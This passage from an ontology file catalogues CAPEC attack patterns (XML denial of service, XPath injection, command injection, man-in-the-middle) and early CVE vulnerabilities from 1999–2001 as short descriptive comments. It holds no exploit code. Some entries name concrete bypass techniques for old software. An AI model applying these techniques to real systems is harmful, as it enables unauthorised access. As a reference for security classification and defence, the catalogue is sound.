        rdfs:comment "XML Denial of Service (XDoS) can be applied to any technology that utilizes XML data. This is, of course, most distributed systems technology including Java, .Net, databases, and so on. XDoS is most closely associated with web services, SOAP, and Rest, because remote service requesters can post malicious XML payloads to the service provider designed to exhaust the service provider's memory, CPU, and/or disk space. The main weakness in XDoS is that the service provider generally must inspect, parse, and validate the XML messages to determine routing, workflow, security considerations, and so on. It is exactly these inspection, parsing, and validation routines that XDoS targets. There are three primary attack vectors that XDoS can navigate. First, by targeting a CPU through recursion: an attacker creates a recursive payload and sends to service provider. Second, by targeting memory through jumbo payloads. For instance, when a service provider uses DOM to parse XML, DOM creates in memory representation of XML document, but when document is very large (for example, north of 1 Gb) service provider host may exhaust memory trying to build memory objects. Third, via an XML Ping of death: attack a service provider with numerous small files that clog the system. All of the above attacks exploit the loosely coupled nature of web services, where the service provider has little to no control over the service requester and any messages the service requester sends."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-83

    Annotations: 
        rdfs:comment "An attacker can craft special user-controllable input consisting of XPath expressions to inject the XML database and bypass authentication or glean information that he normally would not be able to. XPath Injection enables an attacker to talk directly to the XML database, thus bypassing the application completely. XPath Injection results from the failure of an application to properly sanitize input used as part of dynamic XPath expressions used to query an XML database."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-84

    Annotations: 
        rdfs:comment "This attack utilizes XQuery to probe and attack server systems; in a similar manner that SQL Injection allows an attacker to exploit SQL calls to RDBMS, XQuery Injection uses improperly validated data that is passed to XQuery commands to traverse and execute commands that the XQuery routines have access to. XQuery injection can be used to enumerate elements on the victim's environment, inject commands to the local host, or execute queries to remote files and data sources."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-85

    Annotations: 
        rdfs:comment "This attack utilizes the frequent client-server roundtrips in Ajax conversation to scan a system. While Ajax does not open up new vulnerabilities per se, it does optimize them from an attacker point of view. In many XSS attacks the attacker must get a \"hole in one\" and successfully exploit the vulnerability on the victim side the first time, once the client is redirected the attacker has many chances to engage in follow on probes, but there is only one first chance. In a widely used web application this is not a major problem because 1 in a 1,000 is good enough in a widely used application. A common first step for an attacker is to footprint the environment to understand what attacks will work. Since footprinting relies on enumeration, the conversational pattern of rapid, multiple requests and responses that are typical in Ajax applications enable an attacker to look for many vulnerabilities, well-known ports, network locations and so on."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-87

    Annotations: 
        rdfs:comment "An attacker employs forceful browsing to access portions of a website that are otherwise unreachable through direct URL entry. Usually, a front controller or similar design pattern is employed to protect access to portions of a web application. Forceful browsing enables an attacker to access information, perform privileged operations and otherwise reach sections of the web application that have been improperly protected."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-88

    Annotations: 
        rdfs:comment "In this type of an attack, an adversary injects operating system commands into existing application functions. An application that uses untrusted input to build command strings is vulnerable. An adversary can leverage OS command injection in an application to elevate privileges, execute arbitrary commands and compromise the underlying operating system."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-89

    Annotations: 
        rdfs:comment "A pharming attack occurs when the victim is fooled into entering sensitive data into supposedly trusted locations, such as an online bank site or a trading platform. An attacker can impersonate these supposedly trusted sites and have the victim be directed to his site rather than the originally intended one. Pharming does not require script injection or clicking on malicious links for the attack to succeed."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-9

    Annotations: 
        rdfs:comment "This attack targets command-line utilities available in a number of shells. An attacker can leverage a vulnerability found in a command-line utility to escalate privilege to root."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-90

    Annotations: 
        rdfs:comment "An attacker can abuse an authentication protocol susceptible to reflection attack in order to defeat it. Doing so allows the attacker illegitimate access to the target system, without possessing the requisite credentials.

Reflection attacks are of great concern to authentication protocols that rely on a challenge-handshake or similar mechanism. An attacker can impersonate a legitimate user and can gain illegitimate access to the system by successfully mounting a reflection attack during authentication."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-93

    Annotations: 
        rdfs:comment "Log Injection-Tampering-Forging"^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-94

    Annotations: 
        rdfs:comment "This type of attack targets the communication between two components (typically client and server). The attacker places himself in the communication channel between the two components. Whenever one component attempts to communicate with the other (data flow, authentication challenges, etc.), the data first goes to the attacker, who has the opportunity to observe or alter it, and it is then passed on to the other component as if it was never intercepted. This interposition is transparent leaving the two compromised components unaware of the potential corruption or leakage of their communications. The potential for Man-in-the-Middle attacks yields an implicit lack of trust in communication or identify between two components."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-95

    Annotations: 
        rdfs:comment "This attack targets the WSDL interface made available by a web service. The attacker may scan the WSDL interface to reveal sensitive information about invocation patterns, underlying technology implementations and associated vulnerabilities. This type of probing is carried out to perform more serious attacks (e.g. parameter tampering, malicious content injection, command injection, etc.). WSDL files provide detailed information about the services ports and bindings available to consumers. For instance, the attacker can submit special characters or malicious content to the Web service and can cause a denial of service condition or illegal access to database records. In addition, the attacker may try to guess other private methods by using the information provided in the WSDL files."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-97

    Annotations: 
        rdfs:comment "Cryptanalysis is a process of finding weaknesses in cryptographic algorithms and using these weaknesses to decipher the ciphertext without knowing the secret key (instance deduction). Sometimes the weakness is not in the cryptographic algorithm itself, but rather in how it is applied that makes cryptanalysis successful. An attacker may have other goals as well, such as: Total Break (finding the secret key), Global Deduction (finding a functionally equivalent algorithm for encryption and decryption that does not require knowledge of the secret key), Information Deduction (gaining some information about plaintexts or ciphertexts that was not previously known) and Distinguishing Algorithm (the attacker has the ability to distinguish the output of the encryption (ciphertext) from a random permutation of bits)."^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CAPEC-99

    Annotations: 
        rdfs:comment "Applications often need to transform data in and out of the XML format by using an XML parser. It may be possible for an attacker to inject data that may have an adverse effect on the XML parser when it is being processed. These adverse effects may include the parser crashing, consuming too much of a resource, executing too slowly, executing code supplied by an attacker, allowing usage of unintended system functionality, etc. An attacker's goal is to leverage parser failure to his or her advantage. In some cases it may be possible to jump from the data plane to the control plane via bad data being passed to an XML parser. [R.99.1]"^^xsd:string
    
    Types: 
        CAPECEntries
    
    
Individual: CVE-1999-0017

    Annotations: 
        rdfs:comment "FTP servers can allow an attacker to connect to arbitrary ports on machines other than the FTP client, aka FTP bounce."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-1999-0067

    Annotations: 
        rdfs:comment "phf CGI program allows remote command execution through shell metacharacters."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-1999-0073

    Annotations: 
        rdfs:comment "Telnet allows a remote client to specify environment variables including LD_LIBRARY_PATH, allowing an attacker to bypass the normal system libraries and gain root access."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-1999-0113

    Annotations: 
        rdfs:comment "Some implementations of rlogin allow root access if given a -froot parameter."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-1999-0168

    Annotations: 
        rdfs:comment "The portmapper may act as a proxy and redirect service requests from an attacker, making the request appear to come from the local host, possibly bypassing authentication that would otherwise have taken place. For example, NFS file systems could be mounted through the portmapper despite export restrictions."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-1999-0426

    Annotations: 
        rdfs:comment "The default permissions of /dev/kmem in Linux versions before 2.0.36 allows IP spoofing."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-1999-0513

    Annotations: 
        rdfs:comment "ICMP messages to broadcast addresses are allowed, allowing for a Smurf attack that can cause a denial of service."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-1999-0783

    Annotations: 
        rdfs:comment "FreeBSD allows local users to conduct a denial of service by creating a hard link from a device special file to a file on an NFS file system."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-1999-0813

    Annotations: 
        rdfs:comment "Cfingerd with ALLOW_EXECUTION enabled does not properly drop privileges when it executes a program on behalf of the user, allowing local users to gain root privileges."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-1999-1029

    Annotations: 
        rdfs:comment "SSH server (sshd2) before 2.0.12 does not properly record login attempts if the connection is closed before the maximum number of tries, allowing a remote attacker to guess the password without showing up in the audit logs."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-1999-1077

    Annotations: 
        rdfs:comment "Idle locking function in MacOS 9 allows local attackers to bypass the password protection of idled sessions via the programmer's switch or CMD-PWR keyboard sequence, which brings up a debugger that the attacker can use to disable the lock."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-1999-1120

    Annotations: 
        rdfs:comment "netprint in SGI IRIX 6.4 and earlier trusts the PATH environmental variable for finding and executing the disable program, which allows local users to gain privileges."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-1999-1125

    Annotations: 
        rdfs:comment "Oracle Webserver 2.1 and earlier runs setuid root, but the configuration file is owned by the oracle account, which allows any local or remote attacker who obtains access to the oracle account to gain privileges or modify arbitrary files by modifying the configuration file."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-1999-1152

    Annotations: 
        rdfs:comment "Compaq/Microcom 6000 Access Integrator does not disconnect a client after a certain number of failed login attempts, which allows remote attackers to guess usernames or passwords via a brute force attack."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-1999-1193

    Annotations: 
        rdfs:comment "The \"me\" user in NeXT NeXTstep 2.1 and earlier has wheel group privileges, which could allow the me user to use the su command to become root."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-1999-1270

    Annotations: 
        rdfs:comment "KMail in KDE 1.0 provides a PGP passphrase as a command line argument to other programs, which could allow local users to obtain the passphrase and compromise the PGP keys of other users by viewing the arguments via programs that list process information, such as ps."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-1999-1324

    Annotations: 
        rdfs:comment "VAXstations running Open VMS 5.3 through 5.5-2 with VMS DECwindows or MOTIF do not properly disable access to user accounts that exceed the break-in limit threshold for failed login attempts, which makes it easier for attackers to conduct brute force password guessing."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-1999-1326

    Annotations: 
        rdfs:comment "wu-ftpd 2.4 FTP server does not properly drop privileges when an ABOR (abort file transfer) command is executed during a file transfer, which causes a signal to be handled incorrectly and allows local and possibly remote attackers to read arbitrary files."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-1999-1379

    Annotations: 
        rdfs:comment "DNS allows remote attackers to use DNS name servers as traffic amplifiers via a UDP DNS query with a spoofed source address, which produces more traffic to the victim than was sent by the attacker."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-1999-1386

    Annotations: 
        rdfs:comment "Perl 5.004_04 and earlier follows symbolic links when running with the -e option, which allows local users to overwrite arbitrary files via a symlink attack on the /tmp/perl-eaXXXXX file."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-1999-1454

    Annotations: 
        rdfs:comment "Macromedia \"The Matrix\" screen saver on Windows 95 with the \"Password protected\" option enabled allows attackers with physical access to the machine to bypass the password prompt by pressing the ESC (Escape) key."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-1999-1549

    Annotations: 
        rdfs:comment "Lynx 2.x does not properly distinguish between internal and external HTML, which may allow a local attacker to read a \"secure\" hidden form value from a temporary file and craft a LYNXOPTIONS: URL that causes Lynx to modify the user's configuration file and execute commands."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2000-0094

    Annotations: 
        rdfs:comment "procfs in BSD systems allows local users to gain root privileges by modifying the /proc/pid/mem interface via a modified file descriptor for stderr."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2000-0101

    Annotations: 
        rdfs:comment "The Make-a-Store OrderPage shopping cart application allows remote users to modify sensitive purchase information via hidden form fields."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2000-0102

    Annotations: 
        rdfs:comment "The SalesCart shopping cart application allows remote users to modify sensitive purchase information via hidden form fields."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2000-0172

    Annotations: 
        rdfs:comment "The mtr program only uses a seteuid call when attempting to drop privileges, which could allow local users to gain root privileges."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2000-0253

    Annotations: 
        rdfs:comment "The dansie shopping cart application cart.pl allows remote attackers to modify sensitive purchase information via hidden form fields."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2000-0254

    Annotations: 
        rdfs:comment "The dansie shopping cart application cart.pl allows remote attackers to obtain the shopping cart database and configuration information via a URL that references either the env, db, or vars form variables."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2000-0315

    Annotations: 
        rdfs:comment "traceroute in NetBSD 1.3.3 and Linux systems allows local unprivileged users to modify the source address of the packets, which could be used in spoofing attacks."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2000-0335

    Annotations: 
        rdfs:comment "The resolver in glibc 2.1.3 uses predictable IDs, which allows a local attacker to spoof DNS query results."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2000-0342

    Annotations: 
        rdfs:comment "Eudora 4.x allows remote attackers to bypass the user warning for executable attachments such as .exe, .com, and .bat by using a .lnk file that refers to the attachment, aka \"Stealth Attachment.\""^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2000-0476

    Annotations: 
        rdfs:comment "xterm, Eterm, and rxvt allow an attacker to cause a denial of service by embedding certain escape characters which force the window to be resized."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2000-0506

    Annotations: 
        rdfs:comment "The \"capabilities\" feature in Linux before 2.2.16 allows local users to cause a denial of service or gain privileges by setting the capabilities to prevent a setuid program from dropping privileges, aka the \"Linux kernel setuid/setcap vulnerability.\""^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2000-0542

    Annotations: 
        rdfs:comment "Tigris remote access server before 11.5.4.22 does not properly record Radius accounting information when a user fails the initial login authentication but subsequently succeeds."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2000-0703

    Annotations: 
        rdfs:comment "suidperl (aka sperl) does not properly cleanse the escape sequence \"~!\" before calling /bin/mail to send an error report, which allows local users to gain privileges by setting the \"interactive\" environmental variable and calling suidperl with a filename that contains the escape sequence."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2000-0758

    Annotations: 
        rdfs:comment "The web interface for Lyris List Manager 3 and 4 allows list subscribers to obtain administrative access by modifying the value of the list_admin hidden form field."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2000-0860

    Annotations: 
        rdfs:comment "The file upload capability in PHP versions 3 and 4 allows remote attackers to read arbitrary files by setting hidden form fields whose names match the names of internal PHP script variables."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2000-0926

    Annotations: 
        rdfs:comment "SmartWin CyberOffice Shopping Cart 2 (aka CyberShop) allows remote attackers to modify price information by changing the \"Price\" hidden form variable."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2000-0944

    Annotations: 
        rdfs:comment "CGI Script Center News Update 1.1 does not properly validate the original news administration password during a password change operation, which allows remote attackers to modify the password without knowing the original password."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2000-0972

    Annotations: 
        rdfs:comment "HP-UX 11.00 crontab allows local users to read arbitrary files via the -e option by creating a symlink to the target file during the crontab session, quitting the session, and reading the error messages that crontab generates."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2000-0979

    Annotations: 
        rdfs:comment "File and Print Sharing service in Windows 95, Windows 98, and Windows Me does not properly check the password for a file share, which allows remote attackers to bypass share access controls by sending a 1-byte password that matches the first character of the real password, aka the \"Share Level Password\" vulnerability."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2000-1117

    Annotations: 
        rdfs:comment "The Extended Control List (ECL) feature of the Java Virtual Machine (JVM) in Lotus Notes Client R5 allows malicious web site operators to determine the existence of files on the client by measuring delays in the execution of the getSystemResource method."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2000-1178

    Annotations: 
        rdfs:comment "Joe text editor follows symbolic links when creating a rescue copy called DEADJOE during an abnormal exit, which allows local users to overwrite the files of other users whose joe session crashes."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2000-1179

    Annotations: 
        rdfs:comment "Netopia ISDN Router 650-ST before 4.3.5 allows remote attackers to read system logs without authentication by directly connecting to the login screen and typing certain control characters."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2000-1212

    Annotations: 
        rdfs:comment "Zope 2.2.0 through 2.2.4 does not properly protect a data updating method on Image and File objects, which allows attackers with DTML editing privileges to modify the raw data of these objects."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2000-1213

    Annotations: 
        rdfs:comment "ping in iputils before 20001010, as distributed on Red Hat Linux 6.2 through 7J and other operating systems, does not drop privileges after acquiring a raw socket, which increases ping's exposure to bugs that otherwise would occur at lower privileges."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2000-1218

    Annotations: 
        rdfs:comment "The default configuration for the domain name resolver for Microsoft Windows 98, NT 4.0, 2000, and XP sets the QueryIpMatching parameter to 0, which causes Windows to accept DNS updates from hosts that it did not query, which allows remote attackers to poison the DNS cache."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2000-1234

    Annotations: 
        rdfs:comment "violation.php3 in Phorum 3.0.7 allows remote attackers to send e-mails to arbitrary addresses and possibly use Phorum as a \"spam proxy\" by setting the Mod and ForumName parameters."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2001-0006

    Annotations: 
        rdfs:comment "The Winsock2ProtocolCatalogMutex mutex in Windows NT 4.0 has inappropriate Everyone/Full Control permissions, which allows local users to modify the permissions to \"No Access\" and disable Winsock network connectivity to cause a denial of service, aka the \"Winsock Mutex\" vulnerability."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2001-0088

    Annotations: 
        rdfs:comment "common.inc.php in phpWebLog 0.4.2 does not properly initialize the $CONF array, which inadvertently sets the password to a single character, allowing remote attackers to easily guess the SiteKey and gain administrative privileges to phpWebLog."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2001-0128

    Annotations: 
        rdfs:comment "Zope before 2.2.4 does not properly compute local roles, which could allow users to bypass specified access restrictions and gain privileges."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2001-0150

    Annotations: 
        rdfs:comment "Internet Explorer 5.5 and earlier executes Telnet sessions using command line arguments that are specified by the web site, which could allow remote attackers to execute arbitrary commands if the IE client is using the Telnet client provided in Services for Unix (SFU) 2.0, which creates session transcripts."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2001-0178

    Annotations: 
        rdfs:comment "kdesu program in KDE2 (KDE before 2.2.0-6) does not properly verify the owner of a UNIX socket that is used to send a password, which allows local users to steal passwords and gain privileges."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2001-0195

    Annotations: 
        rdfs:comment "sash before 3.4-4 in Debian GNU/Linux does not properly clone /etc/shadow, which makes it world-readable and could allow local users to gain privileges via password cracking."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2001-0395

    Annotations: 
        rdfs:comment "Lightwave ConsoleServer 3200 does not disconnect users after unsuccessful login attempts, which could allow remote attackers to conduct brute force password guessing."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2001-0497

    Annotations: 
        rdfs:comment "dnskeygen in BIND 8.2.4 and earlier, and dnssec-keygen in BIND 9.1.2 and earlier, set insecure permissions for a HMAC-MD5 shared secret key file used for DNS Transactional Signatures (TSIG), which allows attackers to obtain the keys and perform dynamic DNS updates."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2001-0559

    Annotations: 
        rdfs:comment "crontab in Vixie cron 3.0.1 and earlier does not properly drop privileges after the failed parsing of a modification operation, which could allow a local attacker to gain additional privileges when an editor is called to correct the error."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2001-0667

    Annotations: 
        rdfs:comment "Internet Explorer 6 and earlier, when used with the Telnet client in Services for Unix (SFU) 2.0, allows remote attackers to execute commands by spawning Telnet with a log file option on the command line and writing arbitrary code into an executable file which is later executed, aka a new variant of the Telnet Invocation vulnerability as described in CVE-2001-0150."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2001-0677

    Annotations: 
        rdfs:comment "Eudora 5.0.2 allows a remote attacker to read arbitrary files via an email with the path of the target file in the \"Attachment Converted\" MIME header, which sends the file when the email is forwarded to the attacker by the user."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2001-0787

    Annotations: 
        rdfs:comment "LPRng in Red Hat Linux 7.0 and 7.1 does not properly drop memberships in supplemental groups when lowering privileges, which could allow a local user to elevate privileges."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2001-0854

    Annotations: 
        rdfs:comment "PHP-Nuke 5.2 allows remote attackers to copy and delete arbitrary files by calling case.filemanager.php with admin.php as an argument, which sets the $PHP_SELF variable and makes it appear that case.filemanager.php is being called by admin.php instead of the user."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2001-0901

    Annotations: 
        rdfs:comment "Hypermail allows remote attackers to execute arbitrary commands on a server supporting SSI via an attachment with a .shtml extension, which is archived on the server and can then be executed by requesting the URL for the attachment."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2001-0950

    Annotations: 
        rdfs:comment "ValiCert Enterprise Validation Authority (EVA) Administration Server 3.3 through 4.2.1 uses insufficiently random data to (1) generate session tokens for HSMs using the C rand function, or (2) generate certificates or keys using /dev/urandom instead of another source which blocks when the entropy pool is low, which could make it easier for local or remote attackers to steal tokens or certificates via brute force guessing."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2001-0967

    Annotations: 
        rdfs:comment "Knox Arkeia server 4.2, and possibly other versions, uses a constant salt when encrypting passwords using the crypt() function, which makes it easier for an attacker to conduct brute force password guessing."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2001-0984

    Annotations: 
        rdfs:comment "Password Safe 1.7(1) leaves cleartext passwords in memory when a user copies the password to the clipboard and minimizes Password Safe with the \"Clear the password when minimized\" and \"Lock password database on minimize and prompt on restore\" options enabled, which could allow an attacker with access to the memory (e.g. an administrator) to read the passwords."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2001-1025

    Annotations: 
        rdfs:comment "PHP-Nuke 5.x allows remote attackers to perform arbitrary SQL operations by modifying the \"prefix\" variable when calling any scripts that do not already define the prefix variable (e.g., by including mainfile.php), such as article.php."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2001-1029

    Annotations: 
        rdfs:comment "libutil in OpenSSH on FreeBSD 4.4 and earlier does not drop privileges before verifying the capabilities for reading the copyright and welcome files, which allows local users to bypass the capabilities checks and read arbitrary files by specifying alternate copyright or welcome files."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2001-1042

    Annotations: 
        rdfs:comment "Transsoft Broker 5.9.5.0 allows remote attackers to read arbitrary files and directories by uploading a .lnk (link) file that points to the target file."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2001-1043

    Annotations: 
        rdfs:comment "ArGoSoft FTP Server 1.2.2.2 allows remote attackers to read arbitrary files and directories by uploading a .lnk (link) file that points to the target file."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2001-1125

    Annotations: 
        rdfs:comment "Symantec LiveUpdate before 1.6 does not use cryptography to ensure the integrity of download files, which allows remote attackers to execute arbitrary code via DNS spoofing of the update.symantec.com site."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2001-1141

    Annotations: 
        rdfs:comment "The Pseudo-Random Number Generator (PRNG) in SSLeay and OpenSSL before 0.9.6b allows attackers to use the output of small PRNG requests to determine the internal state information, which could be used by attackers to predict future pseudo-random numbers."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2001-1155

    Annotations: 
        rdfs:comment "TCP Wrappers (tcp_wrappers) in FreeBSD 4.1.1 through 4.3 with the PARANOID ACL option enabled does not properly check the result of a reverse DNS lookup, which could allow remote attackers to bypass intended access restrictions via DNS spoofing."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2001-1166

    Annotations: 
        rdfs:comment "linprocfs on FreeBSD 4.3 and earlier does not properly restrict access to kernel memory, which allows one process with debugging rights on a privileged process to read restricted memory from that process."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2001-1246

    Annotations: 
        rdfs:comment "PHP 4.0.5 through 4.1.0 in safe mode does not properly cleanse the 5th parameter to the mail() function, which allows local users and possibly remote attackers to execute arbitrary commands via shell metacharacters."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2001-1291

    Annotations: 
        rdfs:comment "The telnet server for 3Com hardware such as PS40 SuperStack II does not delay or disconnect remote attackers who provide an incorrect username or password, which makes it easier to break into the server via brute force password guessing."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2001-1339

    Annotations: 
        rdfs:comment "Beck IPC GmbH IPC@CHIP telnet service does not delay or disconnect users from the service when bad passwords are entered, which makes it easier for remote attackers to conduct brute force password guessing attacks."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2001-1386

    Annotations: 
        rdfs:comment "WFTPD 3.00 allows remote attackers to read arbitrary files by uploading a (link) file that ends in a \".lnk.\" extension, which bypasses WFTPD's check for a \".lnk\" extension."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2001-1444

    Annotations: 
        rdfs:comment "The Kerberos Telnet protocol, as implemented by KTH Kerberos IV and Kerberos V (Heimdal), does not encrypt authentication and encryption options sent from the server, which allows remote attackers to downgrade authentication and encryption mechanisms via a man-in-the-middle attack."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2001-1452

    Annotations: 
        rdfs:comment "By default, DNS servers on Windows NT 4.0 and Windows 2000 Server cache glue records received from non-delegated name servers, which allows remote attackers to poison the DNS cache via spoofed DNS responses."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2001-1471

    Annotations: 
        rdfs:comment "prefs.php in phpBB 1.4.0 and earlier allows remote authenticated users to execute arbitrary PHP code via an invalid language value, which prevents the variables (1) $l_statsblock in prefs.php or (2) $l_privnotify in auth.php from being properly initialized, which can be modified by the user and later used in an eval statement."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2001-1480

    Annotations: 
        rdfs:comment "Java Runtime Environment (JRE) and SDK 1.2 through 1.3.0_04 allows untrusted applets to access the system clipboard."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2001-1481

    Annotations: 
        rdfs:comment "Xitami 2.4 through 2.5 b4 stores the Administrator password in plaintext in the default.aut file, whose default permissions are world-readable, which allows remote attackers to gain privileges."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2001-1484

    Annotations: 
        rdfs:comment "Alcatel ADSL modems allow remote attackers to access the Trivial File Transfer Protocol (TFTP) to modify firmware and configuration via a bounce attack from a system on the local area network (LAN) side, which is allowed to access TFTP without authentication."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2001-1494

    Annotations: 
        rdfs:comment "script command in the util-linux package before 2.11n allows local users to overwrite arbitrary files by setting a hardlink from the typescript log file to any file on the system, then having root execute the script command."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2001-1514

    Annotations: 
        rdfs:comment "ColdFusion 4.5 and 5, when running on Windows with the advanced security sandbox type set to \"operating system,\" does not properly pass security context to (1) child processes created with <CFEXECUTE> and (2) child processes that call the CreateProcess function and are executed with <CFOBJECT> or end with the CFX extension, which allows attackers to execute programs with the permissions of the System account."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2001-1515

    Annotations: 
        rdfs:comment "Macintosh clients, when using NT file system volumes on Windows 2000 SP1, create subdirectories and automatically modify the inherited NTFS permissions, which may cause the directories to have less restrictive permissions than intended."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2001-1517

    Annotations: 
        rdfs:comment "** DISPUTED ** RunAs (runas.exe) in Windows 2000 stores cleartext authentication information in memory, which could allow attackers to obtain usernames and passwords by executing a process that is allocated the same memory page after termination of a RunAs command. NOTE: the vendor disputes this issue, saying that administrative privileges are already required to exploit it, and the original researcher did not respond to requests for additional information."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2001-1527

    Annotations: 
        rdfs:comment "easyNews 1.5 and earlier stores administration passwords in cleartext in settings.php, which allows local users to obtain the passwords and gain access."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2001-1536

    Annotations: 
        rdfs:comment "Autogalaxy stores usernames and passwords in cleartext in cookies, which makes it easier for remote attackers to obtain authentication information and gain unauthorized access via sniffing or a cross-site scripting attack."^^xsd:string
    
    Types: 
        CVEEntries
    
    
Individual: CVE-2001-1537

    Annotations: 
        rdfs:comment "The default \"basic\" security setting' in config.php for TWIG webmail 2.7.4 and earlier stores cleartext usernames and passwords in cookies, which could allow attackers to obtain authentication information and gain privileges."^^xsd:string
    
